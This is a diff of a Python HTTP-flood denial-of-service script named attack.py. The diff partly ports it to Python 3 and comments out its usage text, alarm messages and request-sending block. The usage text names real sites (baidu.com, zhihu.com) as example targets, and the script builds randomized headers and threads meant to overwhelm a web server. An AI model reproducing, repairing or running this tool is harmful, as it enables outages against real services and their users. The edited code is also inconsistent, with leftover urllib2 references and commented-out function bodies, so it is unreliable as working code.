@@ -11,14 +11,15 @@ import signal
 import socket
 import getopt
 import random
-import urllib2
+import urllib
 import threading
 
 def usage():
-	print ''' usage : python attack.py [-t] [-c] http://www.baidu.com/
-	-h : help
-	-t : lasting time of ddos
-	-c : numbers of thread to create'''
+	# print ''' usage : python attack.py [-t] [-c] http://www.zhihu.com/
+	# -h : help
+	# -t : lasting time of ddos
+	# -c : numbers of thread to create'''
+
 	sys.exit()
 
 # generates a user agent array
@@ -48,9 +49,9 @@ def referer_list():
 	return(headers_referers)
 
 def handler(signum,_):
-	if signum == signal.SIGALRM:
-		print "Time is up !"
-		print "Attack finished !"
+	# if signum == signal.SIGALRM:
+		# print 'Time is up'
+		# print 'Attack finished '
 	sys.exit()
 
 #builds random ascii string
@@ -70,12 +71,12 @@ def send_packet(host,param_joiner):
 	request.add_header('Keep-Alive', random.randint(110,120))
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
-	try:
-		response = urllib2.urlopen(request)
-	except urllib2.HTTPError,error:
-		pass
-	except urllib2.URLError, error:
-		pass
+	# try:
+	# 	response = urllib2.urlopen(request)
+	# except urllib2.HTTPError, error:
+	# 	pass
+	# except urllib2.URLError, error:
+	# 	pass
 #	print "response code = %d "%response.code
 
 def attack(host,param_joiner):
@@ -117,13 +118,13 @@ if __name__ == '__main__':
 		usage()
 		sys.exit()
 	parse_parameters(sys.argv[1:])
-	print "Debug : thread=%d time=%d %s"%(int(num_thread),int(interval),url)
+	print ("Debug : thread=%d time=%d %s"%(int(num_thread),int(interval),url))
 	if url.count('/') == 2:
 		url = url + "/"
 	m = re.search('http\://([^/]*)/?.*', url)
 	try :
 		host = m.group(1)
-	except AttributeError,e:
+	except AttributeError as e:
 		usage()
 		sys.exit()
 
@@ -149,7 +150,7 @@ if __name__ == '__main__':
 #			print ("Child process",os.getpid(),newpid)
 	time.sleep(int(interval))
 	signal.alarm(0)
-	print "main thread exit..."
+	print ("main thread exit...")
 
 
 # 	ddos
